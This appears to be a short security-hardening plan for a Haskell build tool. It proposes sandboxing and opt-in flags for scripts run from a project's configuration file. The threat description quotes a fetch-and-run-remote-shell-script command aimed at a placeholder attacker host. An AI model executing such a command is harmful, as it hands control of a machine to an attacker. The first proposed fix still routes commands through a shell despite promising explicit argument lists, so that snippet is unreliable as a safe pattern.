# Plan 04: Script Execution Sandboxing

**Priority:** HIGH
**Effort:** Small (≤8 hours)
**Risk:** Low

## Problem

`Scripts.hs:93` uses `Process.system cmdStr` to execute arbitrary shell commands from `canopy.json`'s `"scripts"` field with full user privileges. No confirmation, no sandboxing, no opt-in. A malicious `canopy.json` could execute `curl evil.com/shell.sh | sh`.

Currently `runBuildHook` is defined but not wired into the main build path, making this a latent vulnerability. Any future integration would immediately expose it.

## Files to Modify

### `packages/canopy-terminal/src/Scripts.hs`

1. **Replace `Process.system` with `Process.createProcess`** using explicit argument lists:
   ```haskell
   -- Instead of: Process.system cmdStr
   -- Use: Process.createProcess (Process.shell cmdStr) { ... }
   ```

2. **Add explicit opt-in**: Scripts must only run when `--run-scripts` flag is passed:
   ```haskell
   runScript :: Bool -> ScriptName -> Outline.AppOutline -> IO ScriptResult
   runScript allowScripts name appOutline
     | not allowScripts = pure ScriptSkipped
     | otherwise = ...
   ```

3. **Never auto-execute scripts from dependencies** — only from the root project's `canopy.json`

4. **Print clear warning** before execution:
   ```
   WARNING: Running script "prebuild": npm run build
   Use --no-scripts to skip script execution.
   ```

### `packages/canopy-terminal/src/CLI/Commands/Build.hs`

Add `--run-scripts` flag (default: off) and `--no-scripts` flag to the make command.

### `packages/canopy-terminal/src/Make.hs`

Thread the `runScripts` flag through the build pipeline. Only call `runBuildHook` when the flag is true.

## Verification

1. `make build` — zero warnings
2. `make test` — all tests pass
3. Verify scripts do NOT run without `--run-scripts`
4. Verify scripts DO run with `--run-scripts`
5. Verify warning message is printed before execution
